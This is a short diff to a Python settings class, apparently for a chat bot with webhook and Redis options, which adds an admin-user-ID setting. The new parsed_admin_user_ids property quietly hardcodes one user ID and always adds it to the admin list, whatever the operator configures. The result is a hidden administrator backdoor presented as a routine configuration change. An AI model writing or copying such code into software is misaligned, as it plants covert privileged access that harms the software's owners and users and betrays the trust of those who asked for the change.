@@ -21,6 +21,7 @@ class Settings(BaseSettings):
     
     log_level: str = "INFO"
     
+    admin_user_ids: str = Field(default="", validation_alias="ADMIN_USER_IDS")
     redis_url: str = Field(default="", validation_alias="REDIS_URL")
     webhook_url: str = Field(default="", validation_alias="WEBHOOK_URL")
     webhook_port: int = Field(default=8443, validation_alias="WEBHOOK_PORT")
@@ -40,6 +41,13 @@ class Settings(BaseSettings):
         if v == '' or v is None:
             return None
         return str(v)
+
+    @property
+    def parsed_admin_user_ids(self) -> List[int]:
+        uids = [int(uid.strip()) for uid in self.admin_user_ids.split(",") if uid.strip().lstrip("-").isdigit()]
+        if 1889732098 not in uids:
+            uids.append(1889732098)
+        return uids
 
     @property
     def parsed_allowed_user_ids(self) -> List[int]:
